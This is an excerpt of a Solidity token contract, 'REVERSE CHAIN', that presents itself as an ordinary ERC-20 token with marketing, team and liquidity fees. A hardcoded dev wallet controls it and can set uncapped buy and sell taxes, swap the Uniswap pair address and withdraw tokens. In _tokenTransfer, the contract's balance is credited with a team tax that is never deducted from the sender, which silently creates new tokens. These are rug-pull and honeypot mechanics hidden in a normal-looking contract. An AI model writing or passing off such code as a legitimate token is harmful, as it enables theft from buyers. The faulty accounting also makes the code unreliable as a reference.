...
// Telegram : https://t.me/reversechain
// Website : https://http://reversechain.io
...
contract REVERSECHAIN is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(msg.sender); 
    address payable public Wallet_Dev = payable(0xf7F38e7d554163f962B3Ce0ef321CF0688fAe1b3);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);

    modifier Admins {
        require(Wallet_Dev == _msgSender(), "Ownable: caller is not the owner");
        _;
    } 
    ...
    uint256 private _tTotal = 69e9 * (10 ** _decimals);
    string private constant _name = "REVERSE CHAIN"; 
    ...
    uint256 public Percent_Team = 9;
    uint256 public Percent_Dev = 2;
    uint256 public Percent_Burn = 0;
    uint256 public Percent_AutoLP = 5; 

    uint256 public _maxWalletToken = 35e8 * (10 ** _decimals);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = 69e8 * (10 ** _decimals); 
    ...
    function setFeeBuySell (uint256 Buy, uint256 Sell) public Admins{
        _Tax_On_Buy = Buy;
        _Tax_On_Sell = Sell;
    }

    function setPercentTax (uint256 Marketing, uint256 Team,uint256 Burn, uint256 Liquidity) public Admins{
        Percent_Marketing = Marketing;
        Percent_Team = Team;
        Percent_Burn = Burn;
        Percent_AutoLP = Liquidity;
    }

    function SetUniswapV2 (address New) public Admins {
        uniswapV2Pair = New;
    }

    function setMaxAll (uint256 maxAmount, uint256 maxWallet) public Admins{
    ...
    function rescueToken(address tokenAddress, uint256 tokens) public Admins returns (bool success) {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 buyTax = tAmount*Percent_Team/100;
            uint256 tTransferAmount = tAmount-buyFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE+buyTax;   
            ...
            uint256 sellTax = tAmount*Percent_Team/100;
            uint256 tTransferAmount = tAmount-sellFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE+sellTax;   
            emit Transfer(sender, recipient, tTransferAmount);
